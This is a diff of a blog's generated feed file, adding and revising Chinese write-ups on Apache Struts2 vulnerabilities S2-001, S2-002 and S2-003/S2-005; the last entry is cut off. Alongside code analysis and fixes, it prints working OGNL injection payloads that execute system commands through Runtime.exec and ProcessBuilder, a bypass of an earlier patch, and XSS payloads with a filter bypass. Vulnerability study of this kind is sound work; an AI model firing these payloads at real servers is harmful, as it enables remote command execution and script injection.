@@ -4,11 +4,30 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-003/S2-005</title>
+    <link href="/2020/07/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-003-S2-005/"/>
+    <url>/2020/07/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-003-S2-005/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考前面的文章，没有什么代码上的改变，只要更换一下 tomcat 和 struts2 的版本就好。</p><p>我这里使用的是 2.0.11.1 版本的 struts2，然后因为漏洞利用使用到了特殊字符，需要弄一个 <a href="http://archive.apache.org/dist/tomcat/tomcat-6/" target="_blank" rel="noopener">tomcat6</a>，我这里下载的是 6.0.10 版本的 tomcat，开箱即用，非常方便。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">官方通告</a>中，漏洞在于 ParametersInterceptor 里面对 # 的安全保护被绕过了，从而可以操作服务端的上下文对象。</p><p>看一下 ParametersInterceptor 类的源码，可以看出这个类主要是对参数的一些处理，我这里给 setParameters 方法下一个断点，然后访问 <a href="http://localhost:8080/login.action?name=Twings" target="_blank" rel="noopener">http://localhost:8080/login.action?name=Twings</a> 观察调用：</p><pre><code class="java">Map.Entry entry = (Map.Entry) iterator.next();String name = entry.getKey().toString();boolean acceptableName = acceptableName(name)&amp;&amp; (parameterNameAware == null|| parameterNameAware.acceptableParameterName(name));if (acceptableName) {    Object value = entry.getValue();    try {        stack.setValue(name, value);    }     ...}</code></pre><p>可以看到参数名在经过 acceptableName 处理后会进入 stack.setValue 方法，我们跟进去看看：</p><pre><code class="java">public void setValue(String expr, Object value) {    setValue(expr, value, devMode);}</code></pre><p>很明显，这里会把参数名当作一个表达式来执行，我们回想一下 OGNL 表达式达成命令执行的方法，需要用 # 来获取非根对象，而在 acceptableName 方法中：</p><pre><code class="java">protected boolean acceptableName(String name) {    if (name.indexOf(&#39;=&#39;) != -1 || name.indexOf(&#39;,&#39;) != -1 || name.indexOf(&#39;#&#39;) != -1            || name.indexOf(&#39;:&#39;) != -1 || isExcluded(name)) {        return false;    } else {        return true;    }}</code></pre><p>已经把 # 给 ban 掉了，所以无法直接利用。我们看看官方公布的 payload：</p><pre><code>(&#39;\u0023&#39; + &#39;session\&#39;user\&#39;&#39;)(unused)=0wn3d</code></pre><p>很明显它后面会将 \u0023 解码为 #，我们将参数名换成 \u0023 继续调试，最后来到 JavaCharStream 类的 readChar 方法：</p><pre><code class="java">if ((buffer[bufpos] = c = ReadByte()) == &#39;\\&#39;){    UpdateLineColumn(c);    int backSlashCnt = 1;    for (;;) // Read all the backslashes    {        if (++bufpos == available)        AdjustBuffSize();        try        {            if ((buffer[bufpos] = c = ReadByte()) != &#39;\\&#39;)            {                UpdateLineColumn(c);                // found a non-backslash char.                if ((c == &#39;u&#39;) &amp;&amp; ((backSlashCnt &amp; 1) == 1))                {                    if (--bufpos &lt; 0)                        bufpos = bufsize - 1;                    break;                }                backup(backSlashCnt);                return &#39;\\&#39;;            }        }        ...        UpdateLineColumn(c);        backSlashCnt++;    }    // Here, we have seen an odd number of backslash&#39;s followed by a &#39;u&#39;    try    {        while ((c = ReadByte()) == &#39;u&#39;)            ++column;        buffer[bufpos] = c = (char)(hexval(c) &lt;&lt; 12 |                                hexval(ReadByte()) &lt;&lt; 8 |                                hexval(ReadByte()) &lt;&lt; 4 |                                hexval(ReadByte()));        column += 4;    }    ...}</code></pre><p>在读到 \u 的情况下，会继续读入 4 个字符，并将它们转换为 char，也就是把 \u0023 变成了 #，也就绕过了前面的保护，从而可以使用 # 获取到需要的对象。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>接下来就可以构造 payload 实现命令执行了，可以看看这个 OGNL 的<a href="http://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">官方文档</a>，我这里就不研究 OGNL 表达式的语法了（它的语法分析好像叫 javacc 来着，看起来真让人头大），或者可以看看<a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="noopener">这篇文章</a>，我这里直接借用几个 payload：</p><pre><code>(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#39;calc\&#39;)&#39;)(bla)(bla)</code></pre><pre><code>(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</code></pre><p>他这个字符串然后两个括号的执行方式着实奇怪。</p><p>至于为什么需要先将 xwork.MethodAccessor.denyMethodExecution 赋值为 false，那是因为在处理调用方法的 callMethod 方法中，有这么一个验证：</p><pre><code class="java">Boolean exec = (Boolean) context.get(DENY_METHOD_EXECUTION);boolean e = ((exec == null) ? false : exec.booleanValue());if (!e) {    return super.callMethod(context, object, string, objects);} else {    return null;}</code></pre><p>处理调用静态方法的 callStaticMethod 方法也有这个验证：</p><pre><code class="java">public Object callStaticMethod(Map context, Class aClass, String string, Object[] objects) throws MethodFailedException {    Boolean exec = (Boolean) context.get(DENY_METHOD_EXECUTION);    boolean e = ((exec == null) ? false : exec.booleanValue());    if (!e) {        return super.callStaticMethod(context, aClass, string, objects);    } else {        return null;    }}</code></pre><p>如果 DENY_METHOD_EXECUTION 为 true，这里就不会调用方法。</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>按照 S2-005 的说法，S2-005 是 S2-003 的绕过，在 2.2.1 版本之前已经有一次修复（听说是 2.0.12 版本），是通过添加新的类似 DENY_METHOD_EXECUTION 的配置参数来拦截方法调用实现的，而这种修复可以像上面一样通过修改轻易地绕过：</p><pre><code>login.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#39;deepin-calculator\&#39;)&#39;)(bla)(bla)</code></pre><p>而在 2.2.1 版本进行了修复，改变了 acceptableName 里面的白名单限制：</p><pre><code class="java">protected boolean isAccepted(String paramName) {    if (!this.acceptParams.isEmpty()) {        for (Pattern pattern : acceptParams) {            Matcher matcher = pattern.matcher(paramName);            if (matcher.matches()) {                return true;            }        }        return false;    } else        return acceptedPattern.matcher(paramName).matches();}</code></pre><p>而 acceptedPattern 是这样的一个正则：</p><pre><code>[a-zA-Z0-9\.\]\[\(\)_&#39;\s]+</code></pre><p>可以看到 \ 也被拦截了，所以这种利用方式也走不通了。</p><h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>就是上面提到的，在 S2-003 基础上增加新的安全配置后的绕过。</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>见上方。</p><h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>见 2.2.1 版本修复。</p><hr><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="noopener">https://xz.aliyun.com/t/2323</a></p><p><a href="https://xz.aliyun.com/t/7966" target="_blank" rel="noopener">https://xz.aliyun.com/t/7966</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-002</title>
     <link href="/2020/07/15/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-002/"/>
     <url>/2020/07/15/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-002/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境搭建参考 S2-001。</p><p>修改一下模板和 Action 代码，模板加上两个漏洞触发点：</p><pre><code class="java">&lt;s:a href=&quot;%{url}&quot;&gt;click&lt;/s:a&gt;&lt;s:url includeParams=&quot;all&quot;&gt; &lt;/s:url&gt;</code></pre><p>Action 加上 url 变量。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>阅读<a href="https://cwiki.apache.org/confluence/display/WW/S2-002" target="_blank" rel="noopener">官方通告</a>，可以看出漏洞原因就是 s:url 和 s:a 标签在渲染模板的时候没有做好转义编码，从而导致了 XSS。</p><p>官方公布了两种触发点，第一种是渲染 s:a 标签的属性时没有处理好双引号，可以闭合属性、标签然后引入 script 标签，比如这样：</p><pre><code>&quot;&gt;click&lt;/a&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;a href=&quot;</code></pre><p>第二个则是发生在 s:url 的 includeParams 属性中，s:url 是一个生成 URI 的标签，includeParams 属性的作用是设置使用什么请求参数来生成 URI，有 none、get、all 三个选项，当 includeParams 为 all 的时候（get 时无法触发），因为没有对参数名进行恰当处理，所以可以引入 script 标签：</p><pre><code>http://localhost:8080/login.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="s-a-闭合属性"><a href="#s-a-闭合属性" class="headerlink" title="s:a 闭合属性"></a>s:a 闭合属性</h4><p>这个触发点没有什么好分析的，跟 S2-001 的一个流程，只不过因为没有恰当处理导致可以闭合双引号。</p><h4 id="s-url-includeParams"><a href="#s-url-includeParams" class="headerlink" title="s:url includeParams"></a>s:url includeParams</h4><p>这个断点比较难下，我最后下在了 doOpenTag 方法里面，找到 start 方法中对 includeParams 的处理：</p><pre><code class="java">String includeParams = this.urlIncludeParams != null ? this.urlIncludeParams.toLowerCase() : &quot;get&quot;;if (this.includeParams != null) {    includeParams = this.findString(this.includeParams);}if (&quot;none&quot;.equalsIgnoreCase(includeParams)) {    this.mergeRequestParameters(this.value, this.parameters, Collections.EMPTY_MAP);} else if (&quot;all&quot;.equalsIgnoreCase(includeParams)) {    this.mergeRequestParameters(this.value, this.parameters, this.req.getParameterMap());    this.includeGetParameters();    this.includeExtraParameters();} else if (!&quot;get&quot;.equalsIgnoreCase(includeParams) &amp;&amp; (includeParams != null || this.value != null || this.action != null)) {    if (includeParams != null) {        LOG.warn(&quot;Unknown value for includeParams parameter to URL tag: &quot; + includeParams);    }} else {    this.includeGetParameters();    this.includeExtraParameters();}</code></pre><p>all 和 get 的不同只有一个 mergeRequestParameters 方法，在 includeParams 为 all 的情况下会调用 mergeRequestParameters 将 tomcat 处取来的参数：</p><pre><code class="java">Iterator iterator = ((Map)mergedParams).entrySet().iterator();while(iterator.hasNext()) {    Entry entry = (Entry)iterator.next();    Object key = entry.getKey();    if (!parameters.containsKey(key)) {        parameters.put(key, entry.getValue());    }}</code></pre><p>而在 get 时会调用的两个函数中，includeGetParameters 方法则是先获取请求参数字符串，再进行处理分割：</p><pre><code class="java">private void includeGetParameters() {    if (!Dispatcher.getInstance().isPortletSupportActive() || !PortletActionContext.isPortletRequest()) {        String query = this.extractQueryString();        this.mergeRequestParameters(this.value, this.parameters, UrlHelper.parseQueryString(query));    }}private String extractQueryString() {    String query = this.req.getQueryString();    if (query == null) {        query = (String)this.req.getAttribute(&quot;javax.servlet.forward.query_string&quot;);    }    if (query != null) {        int idx = query.lastIndexOf(35);        if (idx != -1) {            query = query.substring(0, idx);        }    }    return query;}</code></pre><p>而调用 this.req.getQueryString 从 tomcat 处获取的请求参数字符串是经过 URL 编码的，所以无法造成 XSS 漏洞。</p><p>includeExtraParameters 则一般为 null。</p><p>而在获取完参数之后，在 end 方法中会调用 buildUrl 开始拼接，最后在 buildParametersString 方法中进行了拼接：</p><pre><code class="java">Iterator iter = params.entrySet().iterator();String[] valueHolder = new String[1];while(iter.hasNext()) {    Entry entry = (Entry)iter.next();    String name = (String)entry.getKey();    Object value = entry.getValue();    String[] values;    if (value instanceof String[]) {        values = (String[])((String[])value);    } else {        valueHolder[0] = value.toString();        values = valueHolder;    }    for(int i = 0; i &lt; values.length; ++i) {        if (values[i] != null) {            link.append(name);            link.append(&#39;=&#39;);            link.append(translateAndEncode(values[i]));        }        if (i &lt; values.length - 1) {            link.append(paramSeparator);        }    }    if (iter.hasNext()) {        link.append(paramSeparator);    }}</code></pre><p>然后发送给客户端，造成 XSS 攻击。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="2-0-11-1-版本修复"><a href="#2-0-11-1-版本修复" class="headerlink" title="2.0.11.1 版本修复"></a>2.0.11.1 版本修复</h4><p>对 s:a 标签的修复如下：</p><pre><code class="java">if (this.href != null) {    this.addParameter(&quot;href&quot;, this.ensureAttributeSafelyNotEscaped(this.findString(this.href)));}</code></pre><p>加上了一个 ensureAttributeSafelyNotEscaped 方法来过滤双引号：</p><pre><code class="java">protected String ensureAttributeSafelyNotEscaped(String val) {    return val != null ? val.replaceAll(&quot;\&quot;&quot;, &quot;&amp;#34;&quot;) : &quot;&quot;;}</code></pre><p>对 s:url 标签的修复如下：</p><pre><code class="java">for(result = link.toString(); result.indexOf(&quot;&lt;script&gt;&quot;) &gt; 0; result = result.replaceAll(&quot;&lt;script&gt;&quot;, &quot;script&quot;)) {    ;}</code></pre><p>在拼接完之后对 script 进行了处理，但是只是简单的将 script 标签的两个尖括号去掉了，所以可以轻松绕过：</p><pre><code>http://localhost:8080/login.action?&lt;script%20id%3d1&gt;alert(1)&lt;/script&gt;test=hello</code></pre><h4 id="2-2-1-版本修复"><a href="#2-2-1-版本修复" class="headerlink" title="2.2.1 版本修复"></a>2.2.1 版本修复</h4><p>本地更换版本运行的时候发生了错误，加上 javassist 依赖后错误消失。</p><p>这个版本的代码发生了大变化，从 URL 类的 end 方法定位到 buildParametersString 方法的遍历拼接中，可以看到拼接调用的是 buildParameterSubstring 方法：</p><pre><code class="java">private static String buildParameterSubstring(String name, String value) {    StringBuilder builder = new StringBuilder();    builder.append(translateAndEncode(name));    builder.append(&#39;=&#39;);    builder.append(translateAndEncode(value));    return builder.toString();}public static String translateAndEncode(String input) {    String translatedInput = translateVariable(input);    String encoding = getEncodingFromConfiguration();    try {        return URLEncoder.encode(translatedInput, encoding);    } catch (UnsupportedEncodingException e) {        LOG.warn(&quot;Could not encode URL parameter &#39;&quot; + input + &quot;&#39;, returning value un-encoded&quot;);        return translatedInput;    }}</code></pre><p>进行了 URL 编码，完全修复了漏洞。</p><hr><p>Orz</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境搭建参考 S2-001，我这里使用的是 2.0.9 版本的 struts2。</p><p>修改一下模板和 Action 代码，模板加上两个漏洞触发点：</p><pre><code class="java">&lt;s:a href=&quot;%{url}&quot;&gt;click&lt;/s:a&gt;&lt;s:url includeParams=&quot;all&quot;&gt; &lt;/s:url&gt;</code></pre><p>Action 加上 url 变量。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>阅读<a href="https://cwiki.apache.org/confluence/display/WW/S2-002" target="_blank" rel="noopener">官方通告</a>，可以看出漏洞原因就是 s:url 和 s:a 标签在渲染模板的时候没有做好转义编码，从而导致了 XSS。</p><p>官方公布了两种触发点，第一种是渲染 s:a 标签的属性时没有处理好双引号，可以闭合属性、标签然后引入 script 标签，比如这样：</p><pre><code>&quot;&gt;click&lt;/a&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;a href=&quot;</code></pre><p>第二个则是发生在 s:url 的 includeParams 属性中，s:url 是一个生成 URI 的标签，includeParams 属性的作用是设置使用什么请求参数来生成 URI，有 none、get、all 三个选项，当 includeParams 为 all 的时候（get 时无法触发），因为没有对参数名进行恰当处理，所以可以引入 script 标签：</p><pre><code>http://localhost:8080/login.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="s-a-闭合属性"><a href="#s-a-闭合属性" class="headerlink" title="s:a 闭合属性"></a>s:a 闭合属性</h4><p>这个触发点没有什么好分析的，跟 S2-001 的一个流程，只不过因为没有恰当处理导致可以闭合双引号。</p><h4 id="s-url-includeParams"><a href="#s-url-includeParams" class="headerlink" title="s:url includeParams"></a>s:url includeParams</h4><p>这个断点比较难下，我最后下在了 doOpenTag 方法里面，找到 start 方法中对 includeParams 的处理：</p><pre><code class="java">String includeParams = this.urlIncludeParams != null ? this.urlIncludeParams.toLowerCase() : &quot;get&quot;;if (this.includeParams != null) {    includeParams = this.findString(this.includeParams);}if (&quot;none&quot;.equalsIgnoreCase(includeParams)) {    this.mergeRequestParameters(this.value, this.parameters, Collections.EMPTY_MAP);} else if (&quot;all&quot;.equalsIgnoreCase(includeParams)) {    this.mergeRequestParameters(this.value, this.parameters, this.req.getParameterMap());    this.includeGetParameters();    this.includeExtraParameters();} else if (!&quot;get&quot;.equalsIgnoreCase(includeParams) &amp;&amp; (includeParams != null || this.value != null || this.action != null)) {    if (includeParams != null) {        LOG.warn(&quot;Unknown value for includeParams parameter to URL tag: &quot; + includeParams);    }} else {    this.includeGetParameters();    this.includeExtraParameters();}</code></pre><p>all 和 get 的不同只有一个 mergeRequestParameters 方法，在 includeParams 为 all 的情况下会调用 mergeRequestParameters 将 tomcat 处取来的参数：</p><pre><code class="java">Iterator iterator = ((Map)mergedParams).entrySet().iterator();while(iterator.hasNext()) {    Entry entry = (Entry)iterator.next();    Object key = entry.getKey();    if (!parameters.containsKey(key)) {        parameters.put(key, entry.getValue());    }}</code></pre><p>而在 get 时会调用的两个函数中，includeGetParameters 方法则是先获取请求参数字符串，再进行处理分割：</p><pre><code class="java">private void includeGetParameters() {    if (!Dispatcher.getInstance().isPortletSupportActive() || !PortletActionContext.isPortletRequest()) {        String query = this.extractQueryString();        this.mergeRequestParameters(this.value, this.parameters, UrlHelper.parseQueryString(query));    }}private String extractQueryString() {    String query = this.req.getQueryString();    if (query == null) {        query = (String)this.req.getAttribute(&quot;javax.servlet.forward.query_string&quot;);    }    if (query != null) {        int idx = query.lastIndexOf(35);        if (idx != -1) {            query = query.substring(0, idx);        }    }    return query;}</code></pre><p>而调用 this.req.getQueryString 从 tomcat 处获取的请求参数字符串是经过 URL 编码的，所以无法造成 XSS 漏洞。</p><p>includeExtraParameters 则一般为 null。</p><p>而在获取完参数之后，在 end 方法中会调用 buildUrl 开始拼接，最后在 buildParametersString 方法中进行了拼接：</p><pre><code class="java">Iterator iter = params.entrySet().iterator();String[] valueHolder = new String[1];while(iter.hasNext()) {    Entry entry = (Entry)iter.next();    String name = (String)entry.getKey();    Object value = entry.getValue();    String[] values;    if (value instanceof String[]) {        values = (String[])((String[])value);    } else {        valueHolder[0] = value.toString();        values = valueHolder;    }    for(int i = 0; i &lt; values.length; ++i) {        if (values[i] != null) {            link.append(name);            link.append(&#39;=&#39;);            link.append(translateAndEncode(values[i]));        }        if (i &lt; values.length - 1) {            link.append(paramSeparator);        }    }    if (iter.hasNext()) {        link.append(paramSeparator);    }}</code></pre><p>然后发送给客户端，造成 XSS 攻击。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="2-0-11-1-版本修复"><a href="#2-0-11-1-版本修复" class="headerlink" title="2.0.11.1 版本修复"></a>2.0.11.1 版本修复</h4><p>对 s:a 标签的修复如下：</p><pre><code class="java">if (this.href != null) {    this.addParameter(&quot;href&quot;, this.ensureAttributeSafelyNotEscaped(this.findString(this.href)));}</code></pre><p>加上了一个 ensureAttributeSafelyNotEscaped 方法来过滤双引号：</p><pre><code class="java">protected String ensureAttributeSafelyNotEscaped(String val) {    return val != null ? val.replaceAll(&quot;\&quot;&quot;, &quot;&amp;#34;&quot;) : &quot;&quot;;}</code></pre><p>对 s:url 标签的修复如下：</p><pre><code class="java">for(result = link.toString(); result.indexOf(&quot;&lt;script&gt;&quot;) &gt; 0; result = result.replaceAll(&quot;&lt;script&gt;&quot;, &quot;script&quot;)) {    ;}</code></pre><p>在拼接完之后对 script 进行了处理，但是只是简单的将 script 标签的两个尖括号去掉了，所以可以轻松绕过：</p><pre><code>http://localhost:8080/login.action?&lt;script%20id%3d1&gt;alert(1)&lt;/script&gt;test=hello</code></pre><h4 id="2-2-1-版本修复"><a href="#2-2-1-版本修复" class="headerlink" title="2.2.1 版本修复"></a>2.2.1 版本修复</h4><p>本地更换版本运行的时候发生了错误，加上 javassist 依赖后错误消失。</p><p>这个版本的代码发生了大变化，从 URL 类的 end 方法定位到 buildParametersString 方法的遍历拼接中，可以看到拼接调用的是 buildParameterSubstring 方法：</p><pre><code class="java">private static String buildParameterSubstring(String name, String value) {    StringBuilder builder = new StringBuilder();    builder.append(translateAndEncode(name));    builder.append(&#39;=&#39;);    builder.append(translateAndEncode(value));    return builder.toString();}public static String translateAndEncode(String input) {    String translatedInput = translateVariable(input);    String encoding = getEncodingFromConfiguration();    try {        return URLEncoder.encode(translatedInput, encoding);    } catch (UnsupportedEncodingException e) {        LOG.warn(&quot;Could not encode URL parameter &#39;&quot; + input + &quot;&#39;, returning value un-encoded&quot;);        return translatedInput;    }}</code></pre><p>进行了 URL 编码，完全修复了漏洞。</p><hr><p>Orz</p>]]></content>
     
     
     
@@ -27,7 +46,7 @@
     <link href="/2020/07/15/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-001/"/>
     <url>/2020/07/15/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-001/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>struts2 环境的搭建<a href="https://www.cnblogs.com/zhangyongheng/p/11647600.html" target="_blank" rel="noopener">参考文章</a>，详细而且好用。</p><p>阅读 S2-001 的<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">官方通告</a>，安装 2.0.8 版本的 struts2 依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;    &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;    &lt;version&gt;2.0.8&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>配置文件和 Action 代码可以参考 Chybeta 师傅的<a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">文章</a>。</p><p>Tomcat 可以配置远程也可以配置本地，没有版本要求的情况下还是本地比较方便一点。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据官方漏洞通告，漏洞算是一个 OGNL 表达式注入的漏洞，原因在于 struts 在渲染模板的时候会递归计算表达式，而 struts 中的 JSP 页面中的表单值跟 Action 变量是绑定的，所以在 username 变量为 %{1+1} 的情况下会在本来的 %{username} 这样的表达式中将 username 当作一个表达式来处理。</p><p>所以漏洞可以在用于页面渲染的变量可控的情况下触发，比如传一个 username，然后 struts 又把这个 username 贴回模板里的时候。</p><p>贴一个命令执行的 payload：</p><pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p>比 spel 的反射链命令执行好看很多。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>不熟悉 struts 和 tomcat 的流程，按照他渲染肯定要获取 username 的想法，给 getUsername 下断点来调试，找到 UIBean.class 的 end 函数：</p><pre><code class="java">public boolean end(Writer writer, String body) {    this.evaluateParams();    try {        super.end(writer, body, false);        this.mergeTemplate(writer, this.buildTemplateName(this.template, this.getDefaultTemplate()));    } catch (Exception var7) {        LOG.error(&quot;error when rendering&quot;, var7);    } finally {        this.popComponentStack();    }    return false;}</code></pre><p>很明显这里就是最后返回 HTML 页面的地方，跟入处理参数的 evaluateParams 方法，看到关键代码：</p><pre><code class="java">Class valueClazz = this.getValueClassType();if (valueClazz != null) {    if (this.value != null) {        this.addParameter(&quot;nameValue&quot;, this.findValue(this.value, valueClazz));    } else if (name != null) {        String expr = name;        if (this.altSyntax()) {            expr = &quot;%{&quot; + name + &quot;}&quot;;        }        this.addParameter(&quot;nameValue&quot;, this.findValue(expr, valueClazz));    }}</code></pre><p>这里的 name 就是变量名 username，valueClazz 就是变量类型，这里将 username 拼接成 %{username} 的表达式并执行，然后用执行结果渲染模板，继续往下走，来到 translateVariables 方法：</p><pre><code class="java">while (true) {    int start = expression.indexOf(open + &quot;{&quot;);    int length = expression.length();    int x = start + 2;    int end;    char c;    int count = 1;    while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) {        c = expression.charAt(x++);        if (c == &#39;{&#39;) {            count++;        } else if (c == &#39;}&#39;) {            count--;        }    }    end = x - 1;    if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) {        String var = expression.substring(start + 2, end);        Object o = stack.findValue(var, asType);        if (evaluator != null) {            o = evaluator.evaluate(o);        }        String left = expression.substring(0, start);        String right = expression.substring(end + 1);        if (o != null) {            if (TextUtils.stringSet(left)) {                result = left + o;            } else {                result = o;            }            if (TextUtils.stringSet(right)) {                result = result + right;            }            expression = left + o + right;        } else {            // the variable doesn&#39;t exist, so don&#39;t display anything            result = left + right;            expression = left + right;        }    } else {        break;    }}</code></pre><p>这里就是漏洞公告里面提到的递归执行表达式了，是一个死循环，不停地寻找最里层的 %{} 表达式，执行之后将返回结果和前后拼接再次寻找 %{} 来执行。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 translateVariables 方法的递归中加上了最大递归层数，一般为 1：</p><pre><code class="java">if (loopCount &gt; maxLoopCount) {    // translateVariables prevent infinite loop / expression recursive evaluation    break;}</code></pre><hr><p>Orz</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>struts2 环境的搭建<a href="https://www.cnblogs.com/zhangyongheng/p/11647600.html" target="_blank" rel="noopener">参考文章</a>，详细而且好用。</p><p>阅读 S2-001 的<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">官方通告</a>，安装 2.0.8 版本的 struts2 依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;    &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;    &lt;version&gt;2.0.8&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>配置文件和 Action 代码可以参考 Chybeta 师傅的<a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">文章</a>。</p><p>Tomcat 可以配置远程也可以配置本地，没有版本要求的情况下还是本地比较方便一点。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" 